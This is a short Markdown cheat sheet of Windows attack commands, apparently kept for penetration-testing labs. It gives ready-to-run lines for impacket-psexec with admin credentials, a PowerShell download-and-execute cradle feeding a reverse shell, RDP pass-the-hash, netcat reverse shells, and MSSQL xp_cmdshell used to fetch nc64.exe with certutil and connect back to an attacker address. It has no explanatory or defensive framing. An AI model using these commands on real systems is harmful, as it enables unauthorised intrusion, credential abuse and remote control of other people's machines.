# PSExec

```sh
impacket-psexec Administrator:'<password>'@$target
```

# PowerShell Reverse Shell

`Invoke-PowerShellTcp.ps1`

Add this line at the end of the script:

```bash
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.57 -Port 4444
```

On target:

```powershell
powershell iex(new-object net.webclient).downloadstring(\"http://10.10.14.57:8000/reverse.ps1\")
```

# RDP

## Connect
```sh
xfreerdp /v:<server_ip> /u:<username> /p:<password> +dynamic-resolution +clipboard
```
## RDP with SMB Share
```sh
xfreerdp3 /v:$target /u:'username' /p:'password' /cert:ignore +clipboard /dynamic-resolution /drive:/home/kali/Transfer,kalishare
```
## RDP with Pass-the-Hash
```sh
xfreerdp /v:192.168.2.141 /u:admin /pth:A9FDFA038C4B75EBC76DC855DD74F0DA
```

# nc.exe powershell

```sh
nc64.exe 192.168.45.204 4444 -e powershell

nc.exe 192.168.45.204 4444 -e powershell
```

# MSSQL

```sh
SQL> enable_xp_cmdshell

SQL> xp_cmdshell whoami
```

```sh
EXEC xp_cmdshell 'certutil -urlcache -split -f http://10.10.14.9:4000/nc64.exe C:\Users\sql_svc\Desktop\nc64.exe';
```

```sh
EXEC xp_cmdshell 'C:\Users\sql_svc\Desktop\nc64.exe -e cmd.exe 10.10.14.9 4455';
```